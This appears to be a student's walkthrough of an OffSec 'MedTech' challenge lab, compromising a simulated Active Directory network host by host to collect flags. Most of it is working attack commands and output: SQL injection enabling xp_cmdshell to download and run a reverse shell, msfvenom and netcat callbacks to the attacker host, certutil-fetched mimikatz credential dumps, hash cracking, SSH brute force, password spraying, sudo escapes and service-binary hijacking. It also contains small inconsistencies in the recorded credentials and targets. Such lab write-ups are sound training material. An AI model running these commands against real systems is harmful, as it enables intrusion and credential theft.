
| IP            | Ports                                      |
| ------------- | ------------------------------------------ |
| 192.168.x.120 | 22, 80                                     |
| 192.168.x.121 | 80, 135, 139, 445, 5985, 5986, 49664-47001 |
| 192.168.x.122 | 22, 1194                                   |
```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ nxc smb 192.168.223.120 192.168.223.121 192.168.223.122
SMB         192.168.223.121 445    WEB02            [*] Windows Server 2022 Build 20348 x64 (name:WEB02) (domain:medtech.com) (signing:False) (SMBv1:None)
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

## .121
add `192.168.223.121 web02.medtech.com web02` to /etc/hosts.

1. 192.168.x.121
	- port 135, 445. Closed anonymous. Enum4linux:
	  ```
==============================================================
|    Domain Information via SMB session for 192.168.174.121    |
 ==============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: WEB02                                                                                                                                
NetBIOS domain name: MEDTECH                                                                                                                                
DNS domain: medtech.com                                                                                                                                     
FQDN: WEB02.dmz.medtech.com                                                                                                                                 
Derived membership: domain member                                                                                                                           
Derived domain: MEDTECH                                                             
	  ```
	- port 80. `/login.aspx` vulnerable to SQLi
		```
		System.Data.SqlClient.SqlException 
		```
		This error message indicates that the server is using MSSQL.
```
## SQL statement 1
'; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.212 LPORT=5985 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe

┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.223.121 - - [27/Nov/2026 00:20:17] "GET /shell.exe HTTP/1.1" 200 -
```

```
## SQL statement 2
'; EXECUTE xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://192.168.45.212/shell.exe -OutFile C:\Windows\Temp\shell.exe"';--
## SQL statement 3
'; EXECUTE xp_cmdshell 'C:\Windows\Temp\shell.exe';--
```

Obtained a reverse shell at penelope port 5985.
Check whoami and privileges. We have SeImpersonate Privilege meaning we can try GodPotato.
```
C:\>whoami
whoami
nt service\mssql$sqlexpress

C:\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

certutil -urlcache -f http://192.168.45.212/GodPotato-NET4.exe Godpotato.exe
certutil -urlcache -f http://192.168.45.212/nc.exe nc.exe

Godpotato.exe -cmd "cmd /c C:\Users\Public\Documents\nc.exe 192.168.45.212 5986 -e cmd.exe"
```

Catch nt authority shell at port 5986. ==🟢`1st flag:proof.txt`==. Transfer mimikatz.exe to dump LSA and SAM.
```
## WEB02 (your shell):
certutil -urlcache -split -f http://192.168.45.212/mimikatz/x64/mimikatz.exe C:\Windows\Temp\m.exe

m.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords
...
...
Authentication Id : 0 ; 123371 (00000000:0001e1eb)
Session           : Service from 0
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 11/27/2026 3:57:23 AM
SID               : S-1-5-21-976142013-3766213998-138799841-1106
        msv :
         [00000003] Primary
         * Username : joe
         * Domain   : MEDTECH
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : 58de53296298ce0f98087ae902c88735
        tspkg :
        wdigest :
         * Username : joe
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : joe
         * Domain   : MEDTECH.COM
         * Password : Flowers1
        ssp :
        credman :
        cloudap :
...
...
mimikatz # lsadump::sam
```

We got credentials `joe:Flowers1`.
`netstat -ano` showed a connection toward `172.16.x.x` — a hint this box bridges both networks. Spray creds.
```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ nxc smb 192.168.223.120 192.168.223.121 192.168.223.122 -u joe -p 'Flowers1'
SMB         192.168.223.121 445    WEB02            [*] Windows Server 2022 Build 20348 x64 (name:WEB02) (domain:medtech.com) (signing:False) (SMBv1:None)
SMB         192.168.223.121 445    WEB02            [+] medtech.com\joe:Flowers1 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ nxc smb 192.168.223.120 192.168.223.121 192.168.223.122 -u joe -p 'Flowers1' --local-auth
SMB         192.168.223.121 445    WEB02            [*] Windows Server 2022 Build 20348 x64 (name:WEB02) (domain:WEB02) (signing:False) (SMBv1:None)
SMB         192.168.223.121 445    WEB02            [-] WEB02\joe:Flowers1 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Found credential `sa:WhileChirpTuesday218` in web.config from `/Users/joe/Downloads/test.zip`
```
mkdir out
tar -xf test.zip -C out
dir out
cd out

type web.config
...
...
        <connectionStrings>
                <add name="myConnectionString" connectionString="server=localhost\SQLEXPRESS;database=webapp;uid=sa;password=WhileChirpTuesday218;Trusted_Connection=False;MultipleActiveResultSets=true; Integrated Security=False; Max Pool Size=500;" />
        </connectionStrings>
...
...
```

## .122
2. 192.168.x.122
We try hydra on offsec user we found in .121 against ssh for .120 and 122
```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ echo -e "192.168.223.120\n192.168.223.122" > ip.txt
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ hydra -l offsec -P /usr/share/wordlists/rockyou.txt -M ip.txt ssh
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-27 01:34:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 2 servers, overall 32 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://(2 targets):22/
[22][ssh] host: 192.168.223.122   login: offsec   password: password

```

Its an lshell (limited shell). We can't penelope ssh lol. ==🟢`2nd flag:local.txt`==
```
ssh offsec@192.168.223.122
```

sudo -l has a privesc on gtfobins. ==🟢`3rd flag:proof.txt`==
```
offsec:~$ sudo -l
[sudo] password for offsec: 
Matching Defaults entries for offsec on lab-pwk2-student-challenge1-122-vpn-248-173:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User offsec may run the following commands on lab-pwk2-student-challenge1-122-vpn-248-173:
    (ALL : ALL) /usr/sbin/openvpn
offsec:~$ sudo openvpn --dev null --script-security 2 --up '/bin/sh -s'
2026-11-27 06:43:05 Cipher negotiation is disabled since neither P2MP client nor server mode is enabled
2026-11-27 06:43:05 OpenVPN 2.5.5 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Mar 22 2022
2026-11-27 06:43:05 library versions: OpenSSL 3.0.2 15 Mar 2022, LZO 2.10
2026-11-27 06:43:05 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
2026-11-27 06:43:05 ******* WARNING *******: All encryption and authentication features disabled -- All data will be tunnelled as clear text and will not be protected against man-in-the-middle changes. PLEASE DO RECONSIDER THIS CONFIGURATION!
2026-11-27 06:43:05 /bin/sh -s null 1500 1500   init
# whoami
root
```

Found `id_rsa` under `/home/mario/.ssh`. Save it to `mario_id_rsa`
```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ nano mario_id_rsa                              
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ chmod 600 mario_id_rsa 
```

## Notes:
https://sarathg.me/offsec_medtech.html#host-vpn122
Why we need to "pivot" at all
That internal subnet is a private domain network, deliberately unreachable from the internet or DMZ. The only way in is through a machine with one leg in each network — the VPN host, or WEB02 (per the netstat clue). Pivoting routes your Kali traffic through one of those so your existing tools can reach internal hosts directly.

**Ligolo vs frp+proxychains**
Either works for this lab. Ligolo-ng is generally nicer day-to-day (one real network route, no `proxychains` prefix needed on every single command), but frp+proxychains is older, extremely widely documented, and worth being comfortable with since you'll run into it in other people's notes and older material constantly. Pick one, but recognize both.

## Pivot

```
# On kali
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# On windows target machine
certutil -urlcache -split -f http://192.168.45.212/agent.exe C:\Windows\Temp\agent.exe
agent.exe -connect 192.168.45.XXX:11601 -ignore-cert
```

```
# On kali
ligolo-ng proxy consoleCopy
session
start

## New kali session 
sudo ip route add 172.16.247.0/24 dev ligolo
```

As joe domain is medtech from mimikatz dump above, we know he is a domain user. Now we just need the domain server.
```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ netexec smb 172.16.223.10 172.16.223.11 172.16.223.12 172.16.223.13 172.16.223.14 172.16.223.82 172.16.223.83
SMB         172.16.223.13   445    PROD01           [*] Windows Server 2022 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:None)
SMB         172.16.223.82   445    CLIENT01         [*] Windows 11 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:None)
SMB         172.16.223.83   445    CLIENT02         [*] Windows 11 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:None)
SMB         172.16.223.12   445    DEV04            [*] Windows Server 2022 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:None)
SMB         172.16.223.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:None)
SMB         172.16.223.11   445    FILES02          [*] Windows Server 2022 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:None)

Running nxc against 7 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```
DC01 is at 172.16.223.10. Add below to `/etc/hosts`
```
172.16.223.10 dc01.medtech.com medtech.com dc01
172.16.223.11 file02.medtech.com files02
172.16.223.12 dev04.medtech.com dev04
172.16.223.13 prod01.medtech.com prod01
172.16.223.82 client01.medtech.com client01
172.16.223.83 client02.medtech.com client02
```
Run bloodhound.
```
bloodhound-python -u joe -p 'Flowers1' -d medtech.com -ns 172.16.223.10 -c All --zip
```
## .14
We can login to .14 as the lone linux machine since it is the only machine with ssh open using mario credentials. ==🟢`4th flag:local.txt`==
```
ssh -i mario_id_rsa mario@172.16.223.14
```

## .11
Check `joe:Flowers1` against all addresses. .11 reads pwned. ==🟢`5th flag:local.txt`==
```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ nxc smb 172.16.223.11 -u joe -p Flowers1
SMB         172.16.223.11   445    FILES02          [*] Windows Server 2022 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:None)
SMB         172.16.223.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
                                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ evil-winrm -i 172.16.223.11 -u joe -p 'Flowers1'

```
No need for privesc as joe is member of Administrator. ==🟢`6th flag:proof.txt`==
```
*Evil-WinRM* PS C:\Users\joe\desktop> whoami /all
USER INFORMATION
----------------
User Name   SID
=========== ============================================
medtech\joe S-1-5-21-976142013-3766213998-138799841-1106

GROUP INFORMATION
-----------------
Group Name                           Type             SID          Attributes
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators               Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
...
...
```

```
type C:\Users\joe\Documents\fileMonitorBackup.log
goomba : 8e9e1516818ce4e54247e71e71b5f436
toad   : 5be63a865b65349851c1f11a067a3068
daisy  : abf36048c1cf88f5603381c5128feb8e
wario  : fdf36048c1cf88f5630381c5e38feb8e
```
So the real workflow on OSCP: you know they're NTLM because of _where you got them_
```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ john --format=nt -w=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Mushroom!        (wario)     
```

## .83
We got credentials wario:`Mushroom1`
Wario can login to .83. ==🟢`7th flag:local.txt`==
```
nxc winrm 172.16.223.83 -u wario -p 'Mushroom!'
WINRM       172.16.223.83   5985   CLIENT02         [*] Windows 11 Build 22000 (name:CLIENT02) (domain:medtech.com) 
WINRM       172.16.223.83   5985   CLIENT02         [+] medtech.com\wario:Mushroom! (Pwn3d!)

evil-winrm -i 172.16.223.83 -u wario -p 'Mushroom!'
```

Run winpeas for privesc.
```
certutil -urlcache -f http://192.168.45.212/winPEASx64.exe winpeas.exe
.\winpeas.exe
```
We found out theres an executable with write permission.
```
Searching executable files in non-default folders with write (equivalent) permissions (can be slow) (T1574.001)
     File Permissions "C:\DevelopmentExecutables\auditTracker.exe": Everyone [Allow: AllAccess],Authenticated Users [Allow: WriteData/CreateFiles]
```
Rewrite executable and catch a reverse shell. ==🟢`8th flag:proof.txt`==
```
## On kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.212 LPORT=4444 -f exe -o auditTracker.exe

## On .83 machine
certutil -urlcache -f http://192.168.45.223:9999/auditTracker.exe auditTracker.exe

## On kali
nc -lvnp 4444
## On .83 machine
sc.exe start auditTracker
```

This wasn't working in the beginning on WEB02. Just remembered to do it on wario machine.
```
C:\Users\Administrator\Desktop>net user /domain
User accounts for \\DC01.medtech.com

-------------------------------------------------------------------------------
Administrator            Guest                    joe                      
krbtgt                   leon                     mario                    
offsec                   peach                    wario                    
yoshi                    
```

## .82
Spray the remaining user on differents hosts with wario password in case of password reuse.
```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ nxc smb 172.16.223.82 -u leon yoshi peach -p 'Mushroom!' --continue-on-success
SMB         172.16.223.82   445    CLIENT02         [*] Windows 11 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:None)
SMB         172.16.223.82   445    CLIENT02         [-] medtech.com\leon:Mushroom! STATUS_LOGON_FAILURE 
SMB         172.16.223.82   445    CLIENT02         [+] (Pwn3d!)
medtech.com\yoshi:Mushroom! 
SMB         172.16.223.82   445    CLIENT02         [-] medtech.com\peach:Mushroom! STATUS_LOGON_FAILURE 
```

Evil-WinRM needs WinRM (5985); `psexec.py` rides over SMB (445). Match the tool to the open port — the earlier `nxc` check already told you which protocol this host accepts. 
==🟢`9th flag:proof.txt`==
```
impacket-psexec yoshi:'Mushroom!'@172.16.223.83
```

## .12
3 machines left. 172.16.223.10, 172.16.223.12, 172.16.223.13
We try rdp for yoshi on this machine since smb and winrm did not turn up `[+]`.
==🟢`10th flag:local.txt`==
```
nxc rdp 172.16.223.12 -u yoshi -p 'Mushroom!'
RDP         172.16.223.12   3389   DEV04            [*] Windows 10 or Windows Server 2016 Build 20348 (name:DEV04) (domain:medtech.com) (nla:True)
RDP         172.16.223.12   3389   DEV04            [+] medtech.com\yoshi:Mushroom! (Pwn3d!)

xfreerdp /v:172.16.223.12 /u:yoshi /p:'Mushroom!' /dynamic-resolution /cert:ignore
```

Run winpeas for privesc.
```
certutil -urlcache -f http://192.168.45.212/winPEASx64.exe winpeas.exe
.\winpeas.exe
```
We found a writable file at `/TEMP/backup.exe` tied to a Scheduled Task, not a Service.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.212 LPORT=443 -f exe -o backup.exe

certutil -urlcache -f http://192.168.45.212/backup.exe backup.exe
```
==🟢`11th flag:proof.txt`==

```
certutil -urlcache -f http://192.168.45.212/mimikatz.exe mimikatz.exe
```
## .13

Mimikatz dump on .12
```
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords
...
         * Username : leon
         * Domain   : MEDTECH
         * NTLM     : 2e208ad146efda5bc44869025e06544a

...
mimikatz # lsadump::sam
```

Creak leon's hash
```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ john --format=nt -w=/usr/share/wordlists/rockyou.txt leon.hash
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
rabbit:)         (?)     
1g 0:00:00:00 DONE (2026-11-27 06:09) 4.545g/s 20104Kp/s 20104Kc/s 20104KC/s rabbitfurr2..rabbit1963
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
```

credential is `leon:rabbit:)`
Netexec spray. ==🟢`12th flag:proof.txt`==
```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ netexec smb 172.16.223.13 -u leon -p 'rabbit:)' 
SMB         172.16.223.13   445    PROD01           [*] Windows Server 2022 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:None)
SMB         172.16.223.13   445    PROD01           [+] medtech.com\leon:rabbit:) (Pwn3d!)
```

```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ impacket-psexec leon:'rabbit:)'@172.16.223.13                                    
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 172.16.223.13.....
[*] Found writable share ADMIN$
[*] Uploading file uKavXvRU.exe
[*] Opening SVCManager on 172.16.223.13.....
[*] Creating service Jufl on 172.16.223.13.....
[*] Starting service Jufl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

```

Mimikatz to check everything
```
certutil -urlcache -f http://192.168.45.212/mimikatz.exe mimikatz.exe
```

```
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords
mimikatz # lsadump::sam
```

## .10

Netexec spray. ==🟢`13th flag:proof.txt`==
```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ netexec smb 172.16.223.10 -u leon -p 'rabbit:)'
SMB         172.16.223.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:None)
SMB         172.16.223.10   445    DC01             [+] medtech.com\leon:rabbit:) (Pwn3d!)
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ impacket-psexec leon:'rabbit:)'@172.16.223.10  
```

```
C:\Users\Administrator\Desktop> type credentials.txt
web01: offsec/century62hisan51
```

`offsec:century62hisan51` credential obtained

## .120

3. 192.168.x.120
Wow. It loops back. Time to ssh in. 
```
┌──(kali㉿kali)-[~/offsec/challengelab/medtech]
└─$ ssh offsec@192.168.223.120 
offsec@192.168.223.120's password: offsec/century62hisan51
```

Quick Privesc. ==🟢`14th flag:proof.txt`==
```
offsec@lab-pwk2-student-challenge1-120-web01-248-173:~$ sudo -l
sudo: unable to resolve host lab-pwk2-student-challenge1-120-web01-248-173: Name or service not known
Matching Defaults entries for offsec on lab-pwk2-student-challenge1-120-web01-248-173:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User offsec may run the following commands on lab-pwk2-student-challenge1-120-web01-248-173:
    (ALL) NOPASSWD: ALL
    (ALL : ALL) NOPASSWD: ALL
offsec@lab-pwk2-student-challenge1-120-web01-248-173:~$ sudo -i
sudo: unable to resolve host lab-pwk2-student-challenge1-120-web01-248-173: Name or service not known
root@lab-pwk2-student-challenge1-120-web01-248-173:~# cd /root
```
